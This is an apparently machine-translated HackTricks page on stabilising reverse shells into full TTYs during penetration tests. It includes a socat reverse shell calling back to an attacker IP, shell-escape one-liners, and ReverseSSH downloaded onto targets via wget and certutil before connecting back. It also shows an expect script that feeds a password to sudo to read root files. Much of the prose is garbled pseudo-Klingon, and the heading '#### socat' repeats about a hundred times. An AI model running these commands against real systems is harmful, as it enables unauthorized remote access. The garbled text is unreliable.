# pIm 'ej 'oH HackTricks AWS Red Team Expert (htARTE) vItlhutlh!

HackTricks Daq 'e' vItlhutlh:

* **tlhIngan Hol** vItlhutlh **HackTricks** **ghItlhmeH** 'ej **HackTricks PDF** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **qaStaHvIS**.
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) vItlhutlh.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) vItlhutlh, **NFTs** [**opensea.io**](https://opensea.io/collection/the-peass-family) **qaStaHvIS**.
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) **joq** 'ej [**telegram group**](https://t.me/peass) **joq** 'ej **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live) **vItlhutlh**.
* **HackTricks** 'ej **HackTricks Cloud** github repos **ghItlhmeH** PRs **jImej**.

## Full TTY

`SHELL` **SHELL** _**/etc/shells**_ **list** **tlhIngan Hol** **ghItlhmeH** **be'**. `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported` **ghItlhmeH**. **bash** **qar** **zsh** **tlhIngan Hol** **ghItlhmeH** **be'** `bash` **chel** **shell** **ghItlhmeH**.

#### Python

{% code overflow="wrap" %}
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

{% hint style="info" %}
**tlhIngan** **Duj** **rows** **'ej** **columns** **number** **'ej** **`stty -a`** **execute** **'ej** **tlhIngan** **script** **'ej** **{% code overflow="wrap" %}**
{% endhint %}
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% code %}

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat

#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Qa'vIn shells**

* `python -c 'import pty; pty.spawn("/bin/sh")'`
* `echo os.system('/bin/bash')`
* `/bin/sh -i`
* `script -qc /bin/bash /dev/null`
* `perl -e 'exec "/bin/sh";'`
* perl: `exec "/bin/sh";`
* ruby: `exec "/bin/sh"`
* lua: `os.execute('/bin/sh')`
* IRB: `exec "/bin/sh"`
* vi: `:!bash`
* vi: `:set shell=/bin/bash:shell`
* nmap: `!sh`

## ReverseSSH

A convenient way for **interactive shell access**, as well as **file transfers** and **port forwarding**, is dropping the statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) onto the target.

Below is an example for `x86` with upx-compressed binaries. For other binaries, check [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Prepare locally to catch the ssh port forwarding request:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
{% endcode %}

* (2a) Linux target:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
{% endcode %}

* (2b) Windows 10 target (for earlier versions, check [project readme](https://github.com/Fahrj/reverse-ssh#features)):

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
{% endcode %}

* 'ej ReverseSSH port forwarding request vItlhutlh. 'ej, 'oH `reverse-ssh(.exe)` chaw'laHbe'lu'chugh, `letmeinbrudipls` default password log in 'e' vItlhutlh.
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## TTY pagh

ghorgh vItlhutlh **programmey Dajatlh** vaj user input cha'logh. vaj, password 'e' `sudo` laH 'e' vItlhutlh:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
